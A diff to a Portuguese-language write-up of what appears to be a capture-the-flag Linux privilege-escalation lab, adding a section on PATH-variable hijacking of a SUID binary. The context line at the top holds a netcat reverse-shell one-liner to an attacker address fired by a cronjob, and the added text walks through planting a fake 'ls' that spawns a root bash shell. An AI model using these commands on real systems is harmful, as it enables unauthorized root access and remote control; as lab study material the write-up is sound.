@@ -468,3 +468,52 @@ echo "mkfifo /tmp/knef; nc 10.8.95.233 8888 0</tmp/knef | /bin/sh >/tmp/knef 2>&
 ```
 
 As duas últimas questões também não necessitam de respostas. É informado apenas para executar o netcat para ficar ouvindo na porta 8888 (nc -lvpn 8888) na máquina atacante e aguardar a execução cronjob, que executa a cada 5 minutos. Com isso será aberto um shell reverso para a máquina atacante.
+
+## Exploiting PATH Variable 
+
+### O que é o PATH?
+
+PATH é uma variável de ambiente em sistemas operacionais Linux e Unix que especifica diretórios que contêm programas executáveis. Quando o usuário executa qualquer comando no terminal, ele procura arquivos executáveis ​​com a ajuda da variável PATH em resposta aos comandos executados por um usuário.
+
+Para visualizar o PATH atual, basta digitar no terminal:
+
+```shell
+echo $PATH
+```
+
+### Como o PATH pode ser utilizado para exploração?
+
+Se existir um binário com SUID, executando-o, podemos ver que ele está chamando o shell do sistema para fazer um processo básico como listar processos com "ps". Ao contrário do exmpleo de SUID anterior, nesta situação não podemos explorá-lo fornecendo um argumento para injeção de comando, então o que podemos fazer para tentar explorar isso?
+
+Podemos reescrever a variável PATH para um local de nossa escolha! Portanto, quando o binário SUID chama o shell do sistema para executar um executável, ele executa um que escrevemos!
+
+Como em qualquer arquivo SUID, ele executará este comando com os mesmos privilégios que o proprietário do arquivo SUID! Se for root, usando este método podemos executar quaisquer comandos que desejarmos como root!
+
+### Questões:
+
+- a. ***Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"***: *Não há necessidade de resposta*
+
+- b. ***Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?***: *ls*
+
+- c. ***Now we know what command to imitate, let's change directory to "tmp".***: *Não há necessidade de resposta*
+
+- d. ***What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating***: *echo "/bin/bash" > ls*
+
+Sobre a questão ***d*** adiciona um conteúdo a um arquivo chamado ***ls***, dentro do diretório ***/tmp***. O conteúdo é executar um shell bash. Isso será usado mais adiante, como uma "imitação" de um comando válido.
+
+- e. ***Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?***: *chmod +x ls*
+
+Sobre a questão ***e***, é preciso dá permissão de execução. Aqui um ponto importante, do ponto de vista de defesa, é uma boa prática o "/tmp" está em uma partição ou locical volume a parte, montado sem permissão de execução.
+
+As demais questões não necessitam de respostas.
+
+Mas para concluir a exploração, é preciso alterar a variável PATH, adicionando o diretório que contém o comando imitação com:
+
+```shell
+export PATH=/tmp:$PATH
+```
+
+Isso fará com que você abra um prompt bash toda vez que usar "***ls***". Se você precisar usar "***ls***" antes de terminar o exploit, use "***/bin/ls***" (caminho absoluto) onde está o executável "***ls***" real.
+
+Depois de terminar o exploit, pode sair do root e usar "***export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH***" para redefinir a variável PATH de volta ao padrão, permitindo que se use "ls" novamente!
+
